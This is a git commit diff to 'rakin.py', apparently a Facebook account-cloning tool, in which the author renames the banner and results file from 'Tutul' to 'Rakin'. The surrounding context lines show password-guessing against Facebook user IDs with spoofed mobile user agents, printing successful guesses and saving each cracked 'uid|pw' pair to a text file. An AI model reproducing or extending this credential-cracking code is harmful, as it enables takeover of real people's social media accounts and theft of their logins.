618ad63425217e75300e3d67406f99b87db6af15
rakin00 <142624635+rakin00@users.noreply.github.com>
2023-08-19 15:50:35 +0600

    Update rakin.py
    Rakin raj fb cloning abal not allow

--- rakin.py
+++ rakin.py
@@ -836,7 +836,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ Tutul ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ Rakin ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -856,7 +856,7 @@ class Main:
 				print("\r \033[0;92m[ Tutul-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-Tutul-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Rakin-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ ANMOL-OK ] %s | %s\033[0;97m         "%(uid, pw))
